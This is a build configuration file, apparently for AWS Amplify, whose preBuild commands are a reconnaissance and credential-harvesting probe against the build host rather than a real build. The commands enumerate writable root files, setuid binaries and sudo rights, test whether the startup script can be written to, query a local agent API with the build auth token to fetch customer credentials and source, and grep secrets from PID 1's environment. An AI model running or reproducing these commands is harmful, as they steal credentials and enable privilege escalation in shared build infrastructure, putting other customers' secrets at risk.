version: 1
frontend:
  phases:
    preBuild:
      commands:
        - echo "=== ID ===" && id
        - echo "=== GROUP WRITABLE FILES ===" && find / -group root -writable -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null | head -20
        - echo "=== GROUP WRITABLE DIRS ===" && find / -group root -writable -type d -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null | head -15
        - echo "=== AGENT API ===" && curl -s "http://127.0.0.1:7831/ping?auth_token=$CODEBUILD_AUTH_TOKEN" 2>/dev/null
        - echo "=== AGENT CREDS ===" && curl -s "http://127.0.0.1:7831/api/v1/credentials/customer?auth_token=$CODEBUILD_AUTH_TOKEN" 2>/dev/null | head -c 200
        - echo "=== AGENT SOURCE ===" && curl -s "http://127.0.0.1:7831/api/v1/source?auth_token=$CODEBUILD_AUTH_TOKEN" 2>/dev/null | head -c 300
        - echo "=== PID1 ENVIRON ===" && cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE "SECRET|TOKEN|AUTH|KEY" | head -5
        - echo "=== SUDO ===" && sudo -l 2>&1 | head -5
        - echo "=== LD_PRELOAD ===" && echo "LD_PRELOAD=$LD_PRELOAD"
        - echo "=== CHANGEHOSTNAME ===" && ls -la /changehostname* /libchangehostname* 2>/dev/null || echo none
        - echo "=== WRITABLE ROOT FILES ===" && find / -writable -user root -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null | head -15
        - echo "=== STARTUP SCRIPTS ===" && ls -la /codebuild/readonly/start /codebuild/readonly/executor-log 2>/dev/null
        - echo "=== CAN WE WRITE TO STARTUP? ===" && test -w /codebuild/readonly/start && echo "WRITABLE" || echo "not writable"
        - echo "=== CODEBUILD ENV ===" && env | grep CODEBUILD | sort
        - echo "=== SETUID ===" && find / -perm -4000 -type f 2>/dev/null | head -5
        - echo "=== DONE ==="
    build:
      commands:
        - echo done > index.html
  artifacts:
    baseDirectory: /codebuild/output/src
    files:
      - '**/*'
